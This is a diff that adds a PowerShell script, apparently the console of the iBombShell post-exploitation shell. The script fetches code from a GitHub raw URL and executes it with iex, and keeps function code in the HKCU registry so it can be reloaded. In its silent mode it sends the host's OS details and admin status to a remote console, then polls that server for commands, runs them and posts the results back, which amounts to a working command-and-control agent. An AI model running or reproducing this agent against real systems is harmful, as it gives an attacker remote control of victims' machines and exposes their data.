@@ -1,0 +1,318 @@
+function console{
+ 
+    param(
+        [Switch] $Silently,
+        [String] $uriConsole,
+        [String] $id,
+        [String] $proxy
+    )
+
+    if ($proxy){ 
+        if(-not $proxy.startswith("http")){
+            $proxy = "http://"+$proxy
+        }
+    }
+
+     if ($PSVersionTable.PSVersion.Major -lt 3) {
+	  return "Upgrade your powershell to version 3 or higher"
+    }
+
+    function loader{
+        param(
+            [Parameter(Mandatory)]
+            [string] $command,
+            [Parameter(Mandatory)]
+            [string] $RawBase,
+            [Parameter(Mandatory)]
+            [string] $RawFunctions
+        )
+
+        $RawURL = $RawBase + $RawFunctions + $command
+        return make_request -URL $RawURL
+    }
+
+    function make_request{
+        param(
+            [string] $method="GET",
+            [Parameter(Mandatory)]
+            [string] $URL,
+            [string] $data
+        )
+        $wc = new-object system.net.WebClient
+        if ($proxy){
+            $prx = new-object System.Net.WebProxy
+            $prx.Address = $proxy
+            $wc.proxy = $prx
+        }
+
+        if ($method -eq "POST"){
+            $wc.UploadString($url, "POST", $data)
+        } else{
+            $webpage = $wc.DownloadData($url)
+            $data = [System.Text.Encoding]::ASCII.GetString($webpage)
+            return $data
+        }
+    }
+
+    # READFUNCTIONS BEGIN
+    function readFunctions{
+                $path = 'HKCU:\Software\Classes\ibombshell'
+                $path_internals = 'hkcu:\software\classes\ibombshell\internals'
+                
+                # Internal
+                $null = (runRead -path $path_internals -isCommand $false) 
+
+                # No Internal
+                $code = (runRead -path $path -isCommand $true)    
+
+                return $code          
+    }
+    
+    function runRead{
+            param(
+                [Parameter(Mandatory)]
+                [String] $path,
+                [Parameter(Mandatory)]
+                [Boolean] $isCommand
+            )
+
+            if(test-path $path)
+            { 
+                $listFunctions = (Get-ChildItem $path).Name
+                $code = ""
+                cd hkcu:
+
+                foreach($i in $listFunctions)
+                { 
+                    $name = $i.split("\")[-1]
+                    if (($name -ne "internals") -and ($name -ne "console")){
+                        $aux = ((Get-Item -Path "$i" | Select-Object -ExpandProperty Property) | ForEach-Object {
+                        New-Object psobject -Property @{"property"=$_;
+                        "Value" = (Get-ItemProperty -Path "$i" -Name $_).$_}}).Value
+                        
+                        if (-not $isCommand) {
+                            $aux | out-string | iex
+                        } else {
+                            $code += ($aux | out-string) + "`r`n"
+                            addCommand -command $name > $null
+                        } 
+                    }
+                }                            
+                    c:
+                    return $code
+            }
+    } # READFUNCTIONS END
+
+    $banner = "
+      ,--.!,    _ ____                  __   _____ __         ____
+   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /
+ ,d08b.  '|``  / / __  / __ \/ __ ``__ \/ __ \\__ \/ __ \/ _ \/ / /
+ 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /
+ ``9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/"
+
+    
+    #Important: URL download ibombshell
+    $gtRawBase = "https://raw.githubusercontent.com/pilarclares/prueba/main/"
+    $gtRawFunctions = "data/functions/"
+    $functionsList = "https://raw.githubusercontent.com/pilarclares/prueba/main/functions.txt"
+
+    [System.Collections.ArrayList]$functionsLoaded = "showcommands", "showfunctions", "quit"
+    [System.Collections.ArrayList]$internalFunctions = "detect-OS", "printprompt", "printData", "isadmin", "commandsearch", "printMessage", "addcommand"
+
+    Set-Variable -Name "functionsLoaded" -Value $functionsLoaded -Scope global
+    Set-Variable -Name "internalFunctions" -Value $internalFunctions -Scope global
+    Set-Variable -Name "condition" -Value $true -Scope global
+
+    if($Silently)
+    {
+        #To Review
+	    $ErrorActionPreference = "SilentlyContinue"
+        
+        loader -command "generateid" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        if(-not($id))
+        {
+            $id = generateid
+        }
+
+        ## Getting system info
+        if (isadmin){
+            $admin = "admin"
+        }else {
+            $admin = "no"
+        }
+
+        $info = Get-CimInstance -ClassName Win32_OperatingSystem
+        $os_version = ($info.caption | Out-String).TrimEnd("`r`n")
+        $os_arch = ($info.OSArchitecture | Out-String).TrimEnd("`r`n")
+
+        #i am new warrior
+        if($uriConsole.Length -ne 0)
+        {
+            # Waiting for a successful connection
+            while ($true)
+            {
+                try 
+                {
+
+                $info = @"
+results={"os_version":"$os_version", "os_arch":"$os_arch", "admin":"$admin"}
+"@
+
+
+                    $req = make_request -method "POST" -URL "$uriConsole/newibombshell/$id" -data $info
+                    break
+                }
+                catch 
+                {
+                    sleep 5
+                }
+            }
+        }
+    }
+    else{     
+        $path = 'hkcu:\software\classes\ibombshell'
+        if((Test-Path $path)){
+            readfunctions | iex  > $null
+        }else{
+            #loader functions default
+            try{
+                $toLoad = "system/detect-OS", "showfunctions", "showcommands", "addcommand", "commandsearch", "quit", "saveandloadfunctions", "version", "isadmin", "print/printprompt", "print/messagedata"
+                foreach($function in $toLoad){
+                    loader -command $function -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                }
+                addcommand -command "savefunctions" > $null
+                addcommand -command "deletefunctionsreg" > $null
+                addcommand -command "version" > $null
+            }catch {
+                write-host "Check Internet Connection"
+                sleep 1
+             }
+        }
+
+        try{
+            #getting function's list
+            $list = make_request -URL $functionsList
+        }catch{
+               $list = "" 
+        }
+
+        $detected_os = detect-OS -basic 
+        if($detected_os -eq "windows") {
+	        $delimet = "`n"
+            $delimet2 = "`r`n"
+        } else {
+            $delimet = "`n"
+            $delimet2 = "`n"
+        }
+        $global:commandList = $list.split($delimet)
+	    $localcommandlist = $list.split($delimet2)
+
+        clear-host
+        write-host -ForegroundColor Yellow $banner
+        write-host 
+        write-host -ForegroundColor Red "Use showcommands to see what can be loaded or showfunctions to see what can be run"
+        write-host
+    }
+
+    $try_connection = 0
+    
+    while($global:condition)
+    {
+
+        if($Silently)
+        {
+            
+            if($uriConsole.Length -ne 0)
+            {
+                try 
+                {
+                    $content = make_request -URL "$uriConsole/ibombshell/$id"
+                } 
+                catch 
+                {
+                    $content = ""
+                    $try_connection += 1
+                    if ($try_connection -eq 5) 
+                    {
+                        # If the connection fails 5 attempts the console closes
+                        break
+                    }
+                }
+
+                if($content.length -gt 0)
+                { 
+                    $results = $content | iex
+           
+                    if (-not $results) {$results = "Executed. No results have been returned from the command"}
+                    #Send results
+                    if ($results.GetType().Name -ne "String")
+                    {
+                        $send = ""
+                        foreach($i in $results)
+                        {
+                            $send = $send + $i + '\n'
+                        }
+                        $results = $send
+                    }
+                    $results = @"
+results=$results
+"@
+                    $r = make_request -method "POST" -URL "$uriConsole/ibombshell/$id"  -data $results
+                } 
+            }
+            sleep 5
+        }
+        else
+        {
+            printprompt
+            $command = Read-Host  
+	        $command = $command.TrimStart()
+            if(($command.Length -eq 0))
+            {
+                continue
+            }
+            if ($command -eq  "cls" -or $command -eq "clear") {
+                cls | iex
+                continue
+            } 
+            if ($command.startswith("#")){
+                $c = $command.split("#")
+                if ($c.Length -gt 1){
+                    $c = $c[1].Trim()
+                    if ($c){
+                        $c | iex
+                    }
+                }
+            }
+            elseif ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded) -and ($command.Split(" ")[0].Equals("loaderext")))
+            {
+                $command | iex | iex
+            }
+            elseif (commandsearch -command $command.split(" ")[0] -list $functionsLoaded)
+            {
+                $command | iex
+            }
+            elseif (commandsearch -command $command -list $localcommandlist)
+            {
+                try {
+                    $result = addcommand -command $command 
+                    if ($result -ne -1) {
+                        loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                        printMessage -message "Function Loaded"
+                    }else{
+                        printMessage -message "That function is already loaded"
+                    }
+                } catch {
+                    printMessage -message "Something went wrong loading the module"
+                    printMessage -message "$_.Exception.Message"
+                    $global:functionsLoaded.removeat($result)
+                }
+            }
+            else
+            {
+                printMessage -message "Stupid Command!"
+            }
+        }
+    }
+}
